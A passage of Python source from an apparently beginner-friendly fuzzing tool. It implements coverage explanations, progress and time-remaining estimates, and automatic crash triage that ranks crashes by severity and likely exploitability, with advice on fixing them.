                steps.append("✨ No crashes found - your code handled all our tests!")
            
            if coverage < 50:
                steps.append("📈 Coverage is low - try adding more diverse seed inputs")
            
            steps.append("🔄 Consider running again with different settings or longer duration")
        
        elif status == "error":
            steps.append("🔧 Check the error message and fix any configuration issues")
            steps.append("🏥 Run a health check to validate your setup")
        
        return steps
    
    def explain_coverage_map(self, coverage_data: Dict[str, Any]) -> Dict[str, Any]:
        """Explain code coverage in simple terms."""
        total = coverage_data.get("total_blocks", 0)
        hit = coverage_data.get("hit_blocks", 0)
        percent = (hit / total * 100) if total > 0 else 0
        
        # Visual representation
        filled = int(percent / 10)
        bar = "█" * filled + "░" * (10 - filled)
        
        return {
            "visual": f"[{bar}] {percent:.1f}%",
            "simple_explanation": f"We've tested {hit:,} out of {total:,} code sections ({percent:.1f}%)",
            "detail": """
**What is code coverage?**
Think of your program as a building with many rooms. Code coverage tells us 
how many rooms we've visited. The more rooms we visit, the more likely we 
are to find bugs hiding in them.

**Why isn't it 100%?**
Some code is hard to reach - it might only run in rare error conditions or 
with very specific inputs. The fuzzer keeps trying to find inputs that 
reach new code.
            """,
            "assessment": self._assess_metric_value("coverage", percent),
            "tips": self._coverage_improvement_tips(percent, coverage_data),
        }
    
    def _coverage_improvement_tips(self, percent: float, coverage_data: Dict) -> List[str]:
        """Generate tips to improve coverage."""
        tips = []
        
        if percent < 30:
            tips.append("📁 Add more diverse seed inputs covering different features")
            tips.append("📖 Use a dictionary file with keywords from your file format")
        elif percent < 60:
            tips.append("⏰ Let the fuzzer run longer to discover more paths")
            tips.append("🎯 Try structure-aware fuzzing if input has a specific format")
        elif percent < 80:
            tips.append("🔍 Check which code isn't covered - it might have complex conditions")
            tips.append("📝 Create targeted seeds for uncovered functionality")
        else:
            tips.append("🎉 Great coverage! Consider longer runs for thorough testing")
        
        return tips


# =============================================================================
# ESTIMATED TIME REMAINING (Beginner Feature 8)
# =============================================================================

@dataclass
class ProgressSnapshot:
    """A snapshot of fuzzing progress at a point in time."""
    timestamp: float  # Unix timestamp
    executions: int
    coverage_percent: float
    unique_paths: int
    crashes_found: int
    corpus_size: int


@dataclass 
class ProgressEstimate:
    """Estimated progress and time remaining."""
    # Current progress
    current_coverage: float
    current_executions: int
    current_paths: int
    elapsed_seconds: int
    
    # Rates
    exec_per_second: float
    coverage_per_hour: float
    paths_per_hour: float
    
    # Estimates
    estimated_coverage_at_completion: float
    estimated_time_to_target_coverage: Optional[int]  # seconds
    estimated_time_to_diminishing_returns: Optional[int]  # seconds
    
    # Predictions
    coverage_prediction_1h: float
    coverage_prediction_4h: float
    coverage_prediction_24h: float
    
    # Status
    is_making_progress: bool
    progress_status: str
    recommendation: str
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "current": {
                "coverage_percent": self.current_coverage,
                "executions": self.current_executions,
                "unique_paths": self.current_paths,
                "elapsed_seconds": self.elapsed_seconds,
                "elapsed_human": _format_duration(self.elapsed_seconds),
            },
            "rates": {
                "exec_per_second": round(self.exec_per_second, 1),
                "coverage_per_hour": round(self.coverage_per_hour, 2),
                "paths_per_hour": round(self.paths_per_hour, 1),
            },
            "estimates": {
                "coverage_at_completion": round(self.estimated_coverage_at_completion, 1),
                "time_to_target_coverage": _format_duration(self.estimated_time_to_target_coverage) if self.estimated_time_to_target_coverage else None,
                "time_to_diminishing_returns": _format_duration(self.estimated_time_to_diminishing_returns) if self.estimated_time_to_diminishing_returns else None,
            },
            "predictions": {
                "coverage_in_1h": round(self.coverage_prediction_1h, 1),
                "coverage_in_4h": round(self.coverage_prediction_4h, 1),
                "coverage_in_24h": round(self.coverage_prediction_24h, 1),
            },
            "status": {
                "is_making_progress": self.is_making_progress,
                "progress_status": self.progress_status,
                "recommendation": self.recommendation,
            },
        }


def _format_duration(seconds: Optional[int]) -> Optional[str]:
    """Format seconds into human-readable duration."""
    if seconds is None:
        return None
    if seconds < 60:
        return f"{seconds}s"
    elif seconds < 3600:
        return f"{seconds // 60}m {seconds % 60}s"
    elif seconds < 86400:
        hours = seconds // 3600
        mins = (seconds % 3600) // 60
        return f"{hours}h {mins}m"
    else:
        days = seconds // 86400
        hours = (seconds % 86400) // 3600
        return f"{days}d {hours}h"


class FuzzingProgressTracker:
    """
    Tracks fuzzing progress and estimates time remaining.
    
    Uses historical data to predict when coverage will plateau,
    estimate time to reach target coverage, and provide
    beginner-friendly progress updates.
    """
    
    def __init__(self, target_coverage: float = 80.0):
        self.target_coverage = target_coverage
        self.snapshots: List[ProgressSnapshot] = []
        self.start_time: Optional[float] = None
        self.last_progress_time: Optional[float] = None
        
        # Configuration
        self.snapshot_interval = 30  # Take snapshot every 30 seconds
        self.min_snapshots_for_prediction = 5
        self.stall_threshold_minutes = 10  # No progress for this long = stalled
    
    def start(self):
        """Start tracking a new fuzzing session."""
        self.snapshots = []
        self.start_time = time.time()
        self.last_progress_time = self.start_time
    
    def record_snapshot(
        self,
        executions: int,
        coverage_percent: float,
        unique_paths: int,
        crashes_found: int,
        corpus_size: int,
    ):
        """Record a progress snapshot."""
        now = time.time()
        
        # Check if enough time has passed since last snapshot
        if self.snapshots:
            last = self.snapshots[-1]
            if now - last.timestamp < self.snapshot_interval:
                return  # Too soon
        
        snapshot = ProgressSnapshot(
            timestamp=now,
            executions=executions,
            coverage_percent=coverage_percent,
            unique_paths=unique_paths,
            crashes_found=crashes_found,
            corpus_size=corpus_size,
        )
        
        self.snapshots.append(snapshot)
        
        # Update last progress time if we made progress
        if self.snapshots and len(self.snapshots) >= 2:
            prev = self.snapshots[-2]
            if snapshot.coverage_percent > prev.coverage_percent or \
               snapshot.unique_paths > prev.unique_paths:
                self.last_progress_time = now
        
        # Limit history to last 1000 snapshots
        if len(self.snapshots) > 1000:
            self.snapshots = self.snapshots[-1000:]
    
    def get_estimate(self) -> Optional[ProgressEstimate]:
        """Get current progress estimate."""
        if not self.snapshots or not self.start_time:
            return None
        
        current = self.snapshots[-1]
        elapsed = int(time.time() - self.start_time)
        
        # Calculate rates
        exec_rate = current.executions / max(elapsed, 1)
        
        # Calculate coverage rate using recent snapshots
        coverage_rate = self._calculate_coverage_rate()
        paths_rate = self._calculate_paths_rate()
        
        # Make predictions
        predictions = self._predict_coverage(coverage_rate)
        
        # Estimate time to target
        time_to_target = self._estimate_time_to_target(coverage_rate)
        
        # Estimate time to diminishing returns
        time_to_plateau = self._estimate_time_to_plateau()
        
        # Determine status
        is_making_progress = self._is_making_progress()
        status = self._get_progress_status(is_making_progress, coverage_rate)
        recommendation = self._get_recommendation(
            current.coverage_percent, 
            is_making_progress, 
            coverage_rate,
            elapsed
        )
        
        return ProgressEstimate(
            current_coverage=current.coverage_percent,
            current_executions=current.executions,
            current_paths=current.unique_paths,
            elapsed_seconds=elapsed,
            exec_per_second=exec_rate,
            coverage_per_hour=coverage_rate * 3600,
            paths_per_hour=paths_rate * 3600,
            estimated_coverage_at_completion=min(100, predictions["24h"]),
            estimated_time_to_target_coverage=time_to_target,
            estimated_time_to_diminishing_returns=time_to_plateau,
            coverage_prediction_1h=predictions["1h"],
            coverage_prediction_4h=predictions["4h"],
            coverage_prediction_24h=predictions["24h"],
            is_making_progress=is_making_progress,
            progress_status=status,
            recommendation=recommendation,
        )
    
    def _calculate_coverage_rate(self) -> float:
        """Calculate coverage growth rate (percent per second)."""
        if len(self.snapshots) < 2:
            return 0.0
        
        # Use recent snapshots for rate calculation
        recent = self.snapshots[-min(20, len(self.snapshots)):]
        if len(recent) < 2:
            return 0.0
        
        first, last = recent[0], recent[-1]
        time_diff = last.timestamp - first.timestamp
        
        if time_diff <= 0:
            return 0.0
        
        coverage_diff = last.coverage_percent - first.coverage_percent
        return max(0, coverage_diff / time_diff)
    
    def _calculate_paths_rate(self) -> float:
        """Calculate path discovery rate (paths per second)."""
        if len(self.snapshots) < 2:
            return 0.0
        
        recent = self.snapshots[-min(20, len(self.snapshots)):]
        if len(recent) < 2:
            return 0.0
        
        first, last = recent[0], recent[-1]
        time_diff = last.timestamp - first.timestamp
        
        if time_diff <= 0:
            return 0.0
        
        paths_diff = last.unique_paths - first.unique_paths
        return max(0, paths_diff / time_diff)
    
    def _predict_coverage(self, coverage_rate: float) -> Dict[str, float]:
        """Predict coverage at future time points."""
        if not self.snapshots:
            return {"1h": 0, "4h": 0, "24h": 0}
        
        current = self.snapshots[-1].coverage_percent
        
        # Apply diminishing returns model
        # Coverage growth slows as we approach 100%
        def predict_at(hours: float) -> float:
            if coverage_rate <= 0:
                return current
            
            # Simple model: rate decreases as coverage increases
            # Final coverage approaches asymptote
            remaining = 100 - current
            growth_factor = 1 - (current / 100) ** 2  # Slower as we get higher
            predicted_growth = coverage_rate * 3600 * hours * growth_factor
            
            return min(100, current + min(predicted_growth, remaining * 0.8))
        
        return {
            "1h": predict_at(1),
            "4h": predict_at(4),
            "24h": predict_at(24),
        }
    
    def _estimate_time_to_target(self, coverage_rate: float) -> Optional[int]:
        """Estimate time to reach target coverage."""
        if not self.snapshots:
            return None
        
        current = self.snapshots[-1].coverage_percent
        
        if current >= self.target_coverage:
            return 0
        
        if coverage_rate <= 0:
            return None  # Not making progress
        
        remaining = self.target_coverage - current
        # Account for diminishing returns
        adjusted_rate = coverage_rate * (1 - current / 100)
        
        if adjusted_rate <= 0:
            return None
        
        seconds = int(remaining / adjusted_rate)
        
        # Cap at reasonable maximum (7 days)
        return min(seconds, 7 * 24 * 3600)
    
    def _estimate_time_to_plateau(self) -> Optional[int]:
        """Estimate when coverage growth will effectively stop."""
        if len(self.snapshots) < self.min_snapshots_for_prediction:
            return None
        
        # Look at coverage rate trend
        rates = []
        for i in range(len(self.snapshots) - 1):
            time_diff = self.snapshots[i + 1].timestamp - self.snapshots[i].timestamp
            if time_diff > 0:
                cov_diff = self.snapshots[i + 1].coverage_percent - self.snapshots[i].coverage_percent
                rates.append(cov_diff / time_diff)
        
        if not rates:
            return None
        
        # Check if rate is declining
        recent_rates = rates[-min(10, len(rates)):]
        avg_rate = sum(recent_rates) / len(recent_rates)
        
        if avg_rate <= 0.0001:  # Very slow growth
            return 0  # Already plateaued
        
        # Estimate based on rate decline
        # This is a rough estimate
        elapsed = time.time() - self.start_time
        if elapsed > 0 and self.snapshots[-1].coverage_percent > 0:
            # Rough estimate: plateau in 2-4x current elapsed time
            return int(elapsed * 3)
        
        return None
    
    def _is_making_progress(self) -> bool:
        """Check if fuzzing is still making meaningful progress."""
        if not self.last_progress_time:
            return True
        
        time_since_progress = time.time() - self.last_progress_time
        return time_since_progress < self.stall_threshold_minutes * 60
    
    def _get_progress_status(self, is_making_progress: bool, coverage_rate: float) -> str:
        """Get a status string describing progress."""
        if not self.snapshots:
            return "🔄 Starting up..."
        
        if not is_making_progress:
            return "⏸️ Coverage has plateaued"
        
        if coverage_rate > 0.01:  # > 1% per 100 seconds
            return "🚀 Making great progress!"
        elif coverage_rate > 0.001:
            return "📈 Steadily exploring new code"
        elif coverage_rate > 0:
            return "🐢 Slow progress (this is normal for mature fuzzing)"
        else:
            return "⏳ Searching for new paths..."
    
    def _get_recommendation(
        self, 
        coverage: float, 
        is_making_progress: bool, 
        coverage_rate: float,
        elapsed: int
    ) -> str:
        """Get a beginner-friendly recommendation."""
        
        # Just started
        if elapsed < 60:
            return "⏳ Just getting started! Let it run for a few minutes."
        
        # Good coverage achieved
        if coverage >= 80:
            return "🎯 Excellent coverage! Consider running overnight for thoroughness."
        
        # Not making progress
        if not is_making_progress:
            if coverage < 30:
                return "💡 Try adding more diverse seeds or using a dictionary file."
            elif coverage < 60:
                return "🔧 Consider structure-aware mutations or longer timeouts."
            else:
                return "✅ Good coverage! The fuzzer may have explored most reachable code."
        
        # Making progress but slow
        if coverage_rate < 0.0001 and elapsed > 3600:
            return "⏰ Progress is slow. This is normal - let it run longer."
        
        # Normal progress
        if coverage < 50:
            return "📊 On track! Keep running to explore more code paths."
        else:
            return "👍 Looking good! Coverage is building steadily."
    
    def get_progress_bar(self, width: int = 30) -> str:
        """Generate a visual progress bar."""
        if not self.snapshots:
            return f"[{'░' * width}] 0%"
        
        coverage = self.snapshots[-1].coverage_percent
        filled = int(coverage / 100 * width)
        
        # Use different characters for progress
        bar = "█" * filled + "░" * (width - filled)
        
        return f"[{bar}] {coverage:.1f}%"
    
    def get_summary(self) -> Dict[str, Any]:
        """Get a beginner-friendly summary of progress."""
        estimate = self.get_estimate()
        
        if not estimate:
            return {
                "status": "Not started",
                "message": "Start fuzzing to see progress",
            }
        
        return {
            "progress_bar": self.get_progress_bar(),
            "elapsed": _format_duration(estimate.elapsed_seconds),
            "coverage": f"{estimate.current_coverage:.1f}%",
            "executions": f"{estimate.current_executions:,}",
            "speed": f"{estimate.exec_per_second:.0f} tests/sec",
            "status": estimate.progress_status,
            "recommendation": estimate.recommendation,
            "predictions": {
                "1_hour": f"{estimate.coverage_prediction_1h:.1f}%",
                "4_hours": f"{estimate.coverage_prediction_4h:.1f}%",
                "24_hours": f"{estimate.coverage_prediction_24h:.1f}%",
            },
        }


# =============================================================================
# AUTO-TRIAGE (Beginner Feature 12)
# =============================================================================

class CrashSeverityLevel(str, Enum):
    """Severity levels for crash triage."""
    CRITICAL = "critical"   # Likely exploitable, needs immediate attention
    HIGH = "high"           # Serious bug, high priority fix
    MEDIUM = "medium"       # Bug that should be fixed
    LOW = "low"             # Minor issue
    INFO = "info"           # Informational, may not be a real bug


@dataclass
class TriagedCrash:
    """A crash with automatic triage information."""
    crash_id: str
    crash_type: CrashType
    severity: CrashSeverityLevel
    severity_score: int  # 0-100
    
    # Triage details
    is_exploitable: bool
    exploitability_reason: str
    is_unique: bool
    similar_crashes: List[str]
    
    # Analysis
    root_cause_guess: str
    affected_component: str
    stack_hash: str
    
    # Beginner-friendly info
    title: str
    summary: str
    what_to_do: List[str]
    priority_rank: int  # 1 = highest priority
    
    # Technical details
    crash_address: Optional[str] = None
    faulting_instruction: Optional[str] = None
    registers: Dict[str, str] = field(default_factory=dict)
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "crash_id": self.crash_id,
            "crash_type": self.crash_type.value,
            "severity": self.severity.value,
            "severity_score": self.severity_score,
            "is_exploitable": self.is_exploitable,
            "exploitability_reason": self.exploitability_reason,
            "is_unique": self.is_unique,
            "similar_crashes": self.similar_crashes,
            "root_cause_guess": self.root_cause_guess,
            "affected_component": self.affected_component,
            "stack_hash": self.stack_hash,
            "title": self.title,
            "summary": self.summary,
            "what_to_do": self.what_to_do,
            "priority_rank": self.priority_rank,
            "crash_address": self.crash_address,
            "faulting_instruction": self.faulting_instruction,
            "registers": self.registers,
        }


@dataclass
class TriageReport:
    """Complete triage report for a fuzzing session."""
    session_id: str
    generated_at: str
    total_crashes: int
    unique_crashes: int
    triaged_crashes: List[TriagedCrash]
    
    # Summary by severity
    critical_count: int
    high_count: int
    medium_count: int
    low_count: int
    
    # Recommendations
    top_priority_crashes: List[str]
    overall_assessment: str
    next_steps: List[str]
    
    def to_dict(self) -> Dict[str, Any]:
        return {
            "session_id": self.session_id,
            "generated_at": self.generated_at,
            "total_crashes": self.total_crashes,
            "unique_crashes": self.unique_crashes,
            "crashes": [c.to_dict() for c in self.triaged_crashes],
            "summary": {
                "by_severity": {
                    "critical": self.critical_count,
                    "high": self.high_count,
                    "medium": self.medium_count,
                    "low": self.low_count,
                },
                "top_priority": self.top_priority_crashes,
            },
            "overall_assessment": self.overall_assessment,
            "next_steps": self.next_steps,
        }


class CrashAutoTriager:
    """
    Automatically triages crashes by severity and exploitability.
    
    Analyzes crash characteristics to determine:
    - Severity level (critical, high, medium, low)
    - Likely exploitability
    - Root cause category
    - Priority for fixing
    
    Makes crash analysis accessible for beginners who don't know
    which bugs to focus on first.
    """
    
    # Severity rules based on crash type
    CRASH_TYPE_SEVERITY = {
        CrashType.HEAP_CORRUPTION: (CrashSeverityLevel.CRITICAL, 95, True),
        CrashType.STACK_OVERFLOW: (CrashSeverityLevel.HIGH, 80, True),
        CrashType.SEGFAULT: (CrashSeverityLevel.HIGH, 75, True),
        CrashType.ABORT: (CrashSeverityLevel.MEDIUM, 50, False),
        CrashType.NULL_DEREF: (CrashSeverityLevel.MEDIUM, 45, False),
        CrashType.TIMEOUT: (CrashSeverityLevel.LOW, 30, False),
        CrashType.DIVISION_BY_ZERO: (CrashSeverityLevel.LOW, 25, False),
        CrashType.UNKNOWN: (CrashSeverityLevel.MEDIUM, 40, False),
    }
    
    # Patterns that indicate higher exploitability
    EXPLOITABLE_PATTERNS = [
        (r"write.*0x[0-9a-f]+", "Write to controlled address"),
        (r"call.*0x[0-9a-f]+", "Call to controlled address"),
        (r"jmp.*0x[0-9a-f]+", "Jump to controlled address"),
        (r"ret.*", "Return address corruption"),
        (r"heap.*overflow", "Heap buffer overflow"),
        (r"use.after.free", "Use after free"),
        (r"double.free", "Double free"),
        (r"format.string", "Format string vulnerability"),
    ]
    
    def __init__(self):
        self.seen_stack_hashes: Dict[str, str] = {}  # hash -> first crash id
        self.crash_groups: Dict[str, List[str]] = {}  # hash -> list of crash ids
    
    def triage_crash(
        self,
        crash_id: str,
        crash_type: CrashType,
        stack_trace: List[str],
        crash_address: Optional[str] = None,
        faulting_instruction: Optional[str] = None,
        registers: Optional[Dict[str, str]] = None,
        input_file: Optional[str] = None,
        asan_output: Optional[str] = None,
    ) -> TriagedCrash:
        """Triage a single crash."""
        
        # Get base severity from crash type
        base_severity, base_score, base_exploitable = self.CRASH_TYPE_SEVERITY.get(
            crash_type, 
            (CrashSeverityLevel.MEDIUM, 40, False)
        )
        
        # Calculate stack hash for deduplication
        stack_hash = self._calculate_stack_hash(stack_trace, crash_address)
        
        # Check for uniqueness
        is_unique = stack_hash not in self.seen_stack_hashes
        similar_crashes = self.crash_groups.get(stack_hash, [])
        
        # Update tracking
        if is_unique:
            self.seen_stack_hashes[stack_hash] = crash_id
            self.crash_groups[stack_hash] = [crash_id]
        else:
            self.crash_groups[stack_hash].append(crash_id)
        
        # Analyze exploitability
        is_exploitable, exploit_reason = self._analyze_exploitability(
            crash_type, stack_trace, crash_address, 
            faulting_instruction, asan_output
        )
        
        # Adjust severity based on analysis
        severity, score = self._adjust_severity(
            base_severity, base_score, 
            is_exploitable, is_unique, len(similar_crashes)
        )
        
        # Guess root cause
        root_cause = self._guess_root_cause(crash_type, stack_trace, asan_output)
        
        # Identify affected component
        component = self._identify_component(stack_trace)
        
        # Generate beginner-friendly info
        title = self._generate_title(crash_type, component, is_exploitable)
        summary = self._generate_summary(crash_type, root_cause, is_exploitable)
        what_to_do = self._generate_action_items(crash_type, is_exploitable, input_file)
        
        return TriagedCrash(
            crash_id=crash_id,
            crash_type=crash_type,
            severity=severity,
            severity_score=score,
            is_exploitable=is_exploitable,
            exploitability_reason=exploit_reason,
            is_unique=is_unique,
            similar_crashes=similar_crashes[:5],  # Limit to 5
            root_cause_guess=root_cause,
            affected_component=component,
            stack_hash=stack_hash,
            title=title,
            summary=summary,
            what_to_do=what_to_do,
            priority_rank=0,  # Set later when ranking
            crash_address=crash_address,
            faulting_instruction=faulting_instruction,
            registers=registers or {},
        )
    
    def _calculate_stack_hash(
        self, 
        stack_trace: List[str], 
        crash_address: Optional[str]
    ) -> str:
        """Calculate a hash for deduplication."""
        # Use top 3-5 frames for hashing
        key_frames = stack_trace[:5] if stack_trace else []
        
        # Normalize frames (remove addresses, keep function names)
        normalized = []
        for frame in key_frames:
            # Extract function name if present
            # Common formats: "func+0x123", "func at file:line", "0x123 in func"
            import re
            match = re.search(r'(?:in\s+)?(\w+)(?:\+|@|\s|$)', frame)
            if match:
                normalized.append(match.group(1))
            else:
                normalized.append(frame[:50])
        
        hash_input = "|".join(normalized)
        if crash_address:
            # Only use last 3 hex digits (offset within function)
            hash_input += f"|{crash_address[-4:]}" if len(crash_address) > 4 else f"|{crash_address}"
        
        return hashlib.md5(hash_input.encode()).hexdigest()[:12]
    
    def _analyze_exploitability(
        self,
        crash_type: CrashType,
        stack_trace: List[str],
        crash_address: Optional[str],
        faulting_instruction: Optional[str],
        asan_output: Optional[str],
    ) -> Tuple[bool, str]:
        """Analyze if a crash is likely exploitable."""
        
        # Check ASAN output first (most reliable)
        if asan_output:
            asan_lower = asan_output.lower()
            if "heap-buffer-overflow" in asan_lower:
                return True, "Heap buffer overflow detected by ASan"
            if "heap-use-after-free" in asan_lower:
                return True, "Use-after-free detected by ASan"
            if "stack-buffer-overflow" in asan_lower:
                return True, "Stack buffer overflow detected by ASan"
            if "double-free" in asan_lower:
                return True, "Double-free detected by ASan"
        
        # Check crash type
        if crash_type == CrashType.HEAP_CORRUPTION:
            return True, "Heap corruption is typically exploitable"
        
        if crash_type == CrashType.STACK_OVERFLOW:
            return True, "Stack overflow may allow control-flow hijacking"
        
        # Check faulting instruction
        if faulting_instruction:
            instr_lower = faulting_instruction.lower()
            if any(op in instr_lower for op in ["call", "jmp", "ret"]):
                return True, f"Crash at control-flow instruction: {faulting_instruction}"
            if "mov" in instr_lower and crash_address:
                # Check if write to user-controlled address
                return True, "Memory write crash - may be exploitable"
        
        # Check patterns in stack trace
        stack_str = " ".join(stack_trace).lower()
        for pattern, reason in self.EXPLOITABLE_PATTERNS:
            if re.search(pattern, stack_str):
                return True, reason
        
        # Default: less likely exploitable
        if crash_type == CrashType.SEGFAULT:
            return False, "Memory access violation - exploitability depends on context"
        
        return False, "No clear indicators of exploitability"
    
    def _adjust_severity(
        self,
        base_severity: CrashSeverityLevel,
        base_score: int,
        is_exploitable: bool,
        is_unique: bool,
        duplicate_count: int,
    ) -> Tuple[CrashSeverityLevel, int]:
        """Adjust severity based on analysis."""
        score = base_score
        
        # Boost for exploitability
        if is_exploitable:
            score += 15
        
        # Penalty for duplicates
        if not is_unique:
            score -= min(10, duplicate_count * 2)
        
        # Clamp score
        score = max(0, min(100, score))
        
        # Determine severity from score
        if score >= 85:
            return CrashSeverityLevel.CRITICAL, score
        elif score >= 65:
            return CrashSeverityLevel.HIGH, score
        elif score >= 40:
            return CrashSeverityLevel.MEDIUM, score
        elif score >= 20:
            return CrashSeverityLevel.LOW, score
        else:
            return CrashSeverityLevel.INFO, score
    
    def _guess_root_cause(
        self,
        crash_type: CrashType,
        stack_trace: List[str],
        asan_output: Optional[str],
    ) -> str:
        """Guess the root cause category."""
        
        if asan_output:
            if "heap-buffer-overflow" in asan_output.lower():
                return "Buffer overflow - writing past allocated memory"
            if "heap-use-after-free" in asan_output.lower():
                return "Use-after-free - using memory after it was freed"
            if "stack-buffer-overflow" in asan_output.lower():
                return "Stack buffer overflow - overwriting stack variables"
            if "null-pointer" in asan_output.lower():
                return "Null pointer dereference - missing null check"
        
        # Guess from crash type
        guesses = {
            CrashType.HEAP_CORRUPTION: "Memory management error - possible buffer overflow or use-after-free",
            CrashType.STACK_OVERFLOW: "Stack exhaustion - likely deep/infinite recursion or large local variables",
            CrashType.SEGFAULT: "Invalid memory access - buffer overflow, null pointer, or use-after-free",
            CrashType.ABORT: "Assertion failure or explicit abort - program detected invalid state",
            CrashType.NULL_DEREF: "Null pointer dereference - missing null check",
            CrashType.TIMEOUT: "Infinite loop or very slow processing",
            CrashType.DIVISION_BY_ZERO: "Division by zero - missing validation",
        }
        
        return guesses.get(crash_type, "Unknown root cause - needs manual analysis")
    
    def _identify_component(self, stack_trace: List[str]) -> str:
        """Identify the likely affected component from stack trace."""
        if not stack_trace:
            return "Unknown"
        
        # Look at top frames
        for frame in stack_trace[:3]:
            frame_lower = frame.lower()
            
            # Common component patterns
            if any(x in frame_lower for x in ["parse", "read", "decode", "load"]):
                return "Input Parser"
            if any(x in frame_lower for x in ["alloc", "malloc", "free", "new", "delete"]):
                return "Memory Allocator"
            if any(x in frame_lower for x in ["compress", "deflate", "inflate", "zlib"]):
                return "Compression Handler"
            if any(x in frame_lower for x in ["crypto", "ssl", "tls", "encrypt", "decrypt"]):
                return "Cryptographic Module"
            if any(x in frame_lower for x in ["network", "socket", "recv", "send"]):
                return "Network Handler"
            if any(x in frame_lower for x in ["file", "fopen", "fread", "fwrite"]):
                return "File Handler"
        
        # Try to extract module name from first frame
        if stack_trace:
            parts = stack_trace[0].split()
            for part in parts:
                if len(part) > 3 and part[0].isalpha():
                    return part[:30]
        
        return "Core Logic"
    
    def _generate_title(
        self, 
        crash_type: CrashType, 
        component: str, 
        is_exploitable: bool
    ) -> str:
        """Generate a beginner-friendly title."""
        exploit_marker = "🔴 " if is_exploitable else ""
        
        titles = {
            CrashType.HEAP_CORRUPTION: f"{exploit_marker}Critical Memory Corruption in {component}",
            CrashType.STACK_OVERFLOW: f"{exploit_marker}Stack Overflow in {component}",
            CrashType.SEGFAULT: f"{exploit_marker}Memory Access Error in {component}",
            CrashType.ABORT: f"Program Abort in {component}",
            CrashType.NULL_DEREF: f"Null Pointer Error in {component}",
            CrashType.TIMEOUT: f"Hang/Timeout in {component}",
            CrashType.DIVISION_BY_ZERO: f"Division by Zero in {component}",
        }
        
        return titles.get(crash_type, f"Crash in {component}")
    
    def _generate_summary(
        self, 
        crash_type: CrashType, 
        root_cause: str, 
        is_exploitable: bool
    ) -> str:
        """Generate a beginner-friendly summary."""
        exploit_warning = "\n\n⚠️ This crash may be exploitable by attackers!" if is_exploitable else ""
        
        return f"**Root Cause:** {root_cause}{exploit_warning}"
    
    def _generate_action_items(
        self, 
        crash_type: CrashType, 
        is_exploitable: bool,
        input_file: Optional[str],
    ) -> List[str]:
        """Generate action items for fixing the crash."""
        items = []
        
        if is_exploitable:
            items.append("🚨 HIGH PRIORITY: This is likely exploitable - fix soon!")
        
        if input_file:
            items.append(f"📁 Test input saved: {input_file}")
        
        items.append("🔍 Reproduce: Run the program with the crashing input")
        items.append("🐛 Debug: Use a debugger (GDB/LLDB) to find exact crash location")
        
        if crash_type in [CrashType.HEAP_CORRUPTION, CrashType.SEGFAULT]:
            items.append("🔬 Tip: Compile with -fsanitize=address for detailed error messages")
        
        if crash_type == CrashType.STACK_OVERFLOW:
            items.append("💡 Look for: Recursive functions or large local variables")
        
        if crash_type == CrashType.TIMEOUT:
            items.append("💡 Look for: Infinite loops or algorithms with bad complexity")
        
        items.append("✅ After fixing: Re-test with the same input to verify")
        
        return items
    
    def generate_report(
        self, 
        session_id: str, 
        crashes: List[TriagedCrash]
    ) -> TriageReport:
        """Generate a complete triage report."""
        
        # Sort by severity score
        sorted_crashes = sorted(crashes, key=lambda c: -c.severity_score)
        
        # Assign priority ranks
        for i, crash in enumerate(sorted_crashes):
            crash.priority_rank = i + 1
        
        # Count by severity
        critical = sum(1 for c in crashes if c.severity == CrashSeverityLevel.CRITICAL)
        high = sum(1 for c in crashes if c.severity == CrashSeverityLevel.HIGH)
        medium = sum(1 for c in crashes if c.severity == CrashSeverityLevel.MEDIUM)
        low = sum(1 for c in crashes if c.severity == CrashSeverityLevel.LOW)
        
        # Get top priority crash IDs
        top_priority = [c.crash_id for c in sorted_crashes[:5]]
        
        # Generate overall assessment
        assessment = self._generate_assessment(critical, high, medium, low, len(crashes))
        
        # Generate next steps
        next_steps = self._generate_next_steps(sorted_crashes)
        
        # Count unique crashes
        unique_count = sum(1 for c in crashes if c.is_unique)
        
        return TriageReport(
            session_id=session_id,
            generated_at=datetime.utcnow().isoformat(),
            total_crashes=len(crashes),
            unique_crashes=unique_count,
            triaged_crashes=sorted_crashes,
            critical_count=critical,
            high_count=high,
            medium_count=medium,
            low_count=low,
            top_priority_crashes=top_priority,
            overall_assessment=assessment,
            next_steps=next_steps,
        )
    
    def _generate_assessment(
        self, 
        critical: int, 
        high: int, 
        medium: int, 
        low: int,
        total: int
    ) -> str:
        """Generate overall assessment text."""
        if total == 0:
            return "✨ No crashes found! Your program handled all test inputs."
        
        if critical > 0:
            return f"🚨 CRITICAL: Found {critical} critical severity crash(es)! These likely represent exploitable vulnerabilities and should be fixed immediately."
        
        if high > 0:
            return f"⚠️ Found {high} high severity crash(es). These are serious bugs that should be prioritized for fixing."
        
        if medium > 0:
            return f"📋 Found {medium} medium severity crash(es). These bugs should be fixed but are lower priority."
        
        return f"ℹ️ Found {low} low severity crash(es). These are minor issues that can be addressed when convenient."
    
    def _generate_next_steps(self, sorted_crashes: List[TriagedCrash]) -> List[str]:
        """Generate next steps based on crashes found."""
        steps = []
        
        if not sorted_crashes:
            steps.append("Continue fuzzing to find more bugs")
            steps.append("Try different seed inputs")
            return steps
        
        # Focus on top crash
        top = sorted_crashes[0]
        
        if top.severity in [CrashSeverityLevel.CRITICAL, CrashSeverityLevel.HIGH]:
            steps.append(f"🔴 Fix '{top.title}' first - it's the most severe")
        
        steps.append("📥 Download crash inputs for local reproduction")
        steps.append("🔬 Use AddressSanitizer for detailed error analysis")
        
        # Check for patterns
        exploitable_count = sum(1 for c in sorted_crashes if c.is_exploitable)
        if exploitable_count > 1:
            steps.append(f"⚠️ {exploitable_count} crashes may be exploitable - prioritize security review")
        
        unique_count = sum(1 for c in sorted_crashes if c.is_unique)
        if unique_count < len(sorted_crashes):
            dup_count = len(sorted_crashes) - unique_count
            steps.append(f"📊 {dup_count} crashes are duplicates - focus on the {unique_count} unique ones")
        
        return steps
    
    def get_quick_summary(self, crashes: List[TriagedCrash]) -> Dict[str, Any]:
        """Get a quick summary suitable for display."""
        if not crashes:
            return {
                "emoji": "✨",
                "headline": "No crashes found",
                "subtext": "Your program is handling all inputs well!",
            }
        
        # Find most severe
        most_severe = max(crashes, key=lambda c: c.severity_score)
        
        severity_emoji = {
            CrashSeverityLevel.CRITICAL: "🚨",
            CrashSeverityLevel.HIGH: "🔴",
            CrashSeverityLevel.MEDIUM: "🟡",
            CrashSeverityLevel.LOW: "🟢",
            CrashSeverityLevel.INFO: "ℹ️",
        }
        
        emoji = severity_emoji.get(most_severe.severity, "🐛")
        
        return {
            "emoji": emoji,
